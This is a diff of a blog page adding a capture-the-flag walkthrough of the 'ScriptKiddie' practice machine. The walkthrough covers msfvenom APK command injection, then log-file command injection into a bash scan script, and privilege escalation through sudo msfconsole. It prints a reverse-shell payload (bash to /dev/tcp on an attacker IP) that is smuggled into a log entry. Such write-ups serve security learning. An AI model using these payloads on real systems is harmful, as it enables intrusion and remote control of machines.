@@ -36,7 +36,7 @@
 <body>
     
     <header class="header text-center">	    
-	    <h1 class="blog-name pt-lg-1 mb-0"><a href="index.html">Hacking  </a></h1>
+	    <h1 class="blog-name pt-lg-1 mb-0"><a href="index.html">Adventures with Bits  </a></h1>
         
 	    <nav class="navbar navbar-expand-lg navbar-dark" >
            
@@ -125,11 +125,10 @@
 				    	<br>
                      
 
-				    	The goal of this write-up is to provide an instinct and supporting materials to work on the machine without 
-				      exposing the solution.
-				    	usual walk-through and write-ups are aimed to solve the box but this is to give an idea how to 
-				    	solve the box without directly exposing the solution.
-				    	this type of walk through will help to solve the box with certain level of information. 
+				    	The goal of this write-up is to provide an instinct and supporting materials to work on the machine to 
+				      reach the solution.
+				    	
+				    	
 				    	i would like to provide a methodology or instinct that you may use to solve
 				    	the boxes.
 
@@ -146,6 +145,7 @@
 				      I usually not only enjoy the solution of the machine i prioritize the path of the solution
 				      and the exploits that used to aid the solution.
 
+				      <br>
 				      <br>
               
               The point of scanning and initial information gathering is to point our direction of instinct to a certain
@@ -165,6 +165,7 @@
               port 22 and 5000 opened, generally ssh service also have vulnerabilities to exploit but here picking port 5000
               would be appropriate since we know basically this is a intentionally vulnerable box and port 5000 giving the below
               interface which we can relate with the machine name 'script kiddie' 
+              <br>
               <br> 
 
 
@@ -179,16 +180,21 @@
               where we can extract some more information which we can use. inspecting upon the source code, there is no
               any possibilities or chance to exploit web technologies such as PHP, Wordpress and etc.
               based on the analysis now we can move on to the next possibility to exploit available tools on the application.
+              <br>
+              <br>
 
                <figure class="blog-banner">
 
 				        <a><img class="img-fluid" src="assets/images/sk_source.png" alt="image"></a>
 
 				      </figure>    
+				      <br>
 
 				      Before being jump into the exploitation part need to verify that these tools are working properly,
 				      after that first starts with nmap. during the search there is no any available exploits to run against nmap,
 				      so move on to the next one which is metasploit-framework.   
+				      <br>
+				      <br>
 
 				       <figure class="blog-banner">
 
@@ -200,20 +206,218 @@
 				      <br>
 				      <a href=https://www.exploit-db.com/exploits/49491> https://www.exploit-db.com/exploits/49491 </a>
               <br>
+              <br>
               let's look at this vulnerability.
+
               <br>
               <a href=
               https://github.com/rapid7/metasploit-framework/pull/14288/commits/d1528cc0aa48ac667304f1e5116a784fe2dc8f15>
             https://github.com/rapid7/metasploit-framework/pull/14288/commits/d1528cc0aa48ac667304f1e5116a784fe2dc8f15 </a>
               <br>
+              <br>
               <a href=https://github.com/rapid7/metasploit-framework/pull/14331> https://github.com/rapid7/metasploit-framework/pull/14331</a>
               <br>
-              
 
+              <a href=https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md> https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md </a>
+              <br>
+              <br>
+              Above links provides a very good explanation of the vulnerability, actually the vulnerability is
+              comes under "Improper Neutralization of Special Elements used in a Command - CWE-77".
+              The vulnerability resides under below code block.
+              <br>
+
+              <pre>
+              <code>
+              	keytool -genkey -v -keystore #{keystore} \
+              -alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \
+              -keysize 2048 -startdate '#{orig_cert_startdate}' \
+              -validity #{orig_cert_validity} -dname '#{orig_cert_dname}'
+              </code>
+            </pre>
+            
+
+              <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/sk_commit.png" alt="image"></a>
+
+				      </figure> 
+
+				      <br>
+
+				      When analyzing the above commit you can see that 'orig_cert_dname' was obtained from where the original APK was parsed and the "Owner" field was extracted from the APK's signature.
+
+				      <br>
+				      <br>
+
+				         <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/sk_apk_parse.png" alt="image"></a>
+
+				      </figure> 
+
+				      <br>
+
+				      This command string is passed to the 'run_cmd' function, by looking at this specific portion it is
+				      possible to inject commands by inserting a single quote (to escape the single-quoted string) and followed by shell meta characters. Justin Steven provided a POC python script to inject commands in apk file.
+
+				      <br>
+				      <br>
+
+                <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/sk_poc.png" alt="image"></a>
+
+				      </figure> 
+
+              <br>
+              so lets exploit this vulnerability to get remote code execution. metasploit it self contains exploit for this
+              vulnerability. 
+              <br>
+              <br>
+
+                <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/sk_metasploit_ex.png" alt="image"></a>
+
+				      </figure> 
+
+				      <br>
+
+				      by setting exploit options and uploading generated apk as template file, remote connection has been established.
+
+				      <br>
+				      <br>
+
+
+                <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/sk_shell.png" alt="image"></a>
+
+				      </figure>
+
+              <br>
+
+              basically for the privilege escalation before being step into additional enumeration, always look for
+              local configuration files, logs and stuff. user credentials and other things can be found to move further.
+              user.txt file is found under 'kid' directory. moving on, it was found that flask application python source code.
+
+                <br>
+                <br>
+
+
+                <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/sk_user.png" alt="image"></a>
+
+				      </figure>
+
+              <br>
+
+              Analyzing the flask application source code i found below function which is interesting to look on.
+
+              <br>
+              <pre>
+              <code>
+
+        def searchsploit(text, srcip):
+           if regex_alphanum.match(text):
+                 result = subprocess.check_output(['searchsploit', '--color', text])
+                 return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
+            else:
+                 with open('/home/kid/logs/hackers', 'a') as f:
+                 f.write(f'[{datetime.datetime.now()}] {srcip}\n')
+                 return render_template('index.html', sserror="stop hacking me - well hack you back")
+
+        </pre>    
+        </code> 
+
+               'regex_alphanum' is defined in the source code, if anything that doesn't match 'regex_alphanum' hackers file 
+               has been written with source ip and time. so lets look at hackers file which is under /home/kid/logs/.
+               hackers file is empty and it clearing the written logs quickly. searching through the directories i found scanlosers.sh file under pwn directory. 
+
+               <pre>
+               <code>
+
+               #!/bin/bash
+
+               log=/home/kid/logs/hackers
+               cd /home/pwn/
+
+               cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+               sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+               done
+
+               if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi   
+                  
+               </pre>
+               </code>
+
+               scanlosers.sh file actually getting input from hackers file and doing nmap scan for top 10 ports.
+               so basically analyzing this whole stuff, there is a chance to inject commands in hackers file to 
+               get executed, since there is no any filter. to do that first need to know how does hackers file saving logs.
+               by running the python code snippet i found log is written in this format - <b>[2021-06-20 13:35:04.728843] 10.10.10.10</b>
+
+               <br>
+               <br>
+
+
+                <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/sk_python_out.png" alt="image"></a>
+
+				      </figure>
+
+              <br>
+
+              scanlosers.sh removing unwanted characters and scanning the IP with nmap, so based on the output there are three items has been written to the hackers file. so to inject command i need to write something below to hackers file.
+              <b> 'A B C 127.0.0.1; COMMAND'</b>. so to get reverse shell i have written this payload to the hackers file.
+              <b> echo "12 13 14 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.20/4040 0>&1' # ."  > hackers </b>
+              in the above payload first four items are just random numbers and IP then the payload is appended.
+              by writing the payload reverse connection has been initiated for the user pwn.
+
+                <br>
+               <br>
+
+
+                <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/sk_pwn.png" alt="image"></a>
+
+				      </figure>
+
+              <br>
+
+              by running sudo -l, it was found that '/opt/metasploit-framework-6.0.9/msfconsole' can be run with sudo.
+              running msfconsole with sudo given root privileges and root.txt found under root directory.
+
+                <br>
+               <br>
+
+
+                <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/sk_sudo.png" alt="image"></a>
+
+				      </figure>
+
+              <br> 
+
+
+             
+               <br>
+
+
+                <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/sk_root.png" alt="image"></a>
+
+				      </figure>
 
 
 
 				    </p>
+
+				    <!--------------------------------------------Article End ------------------------------------------------------>
 
 
 
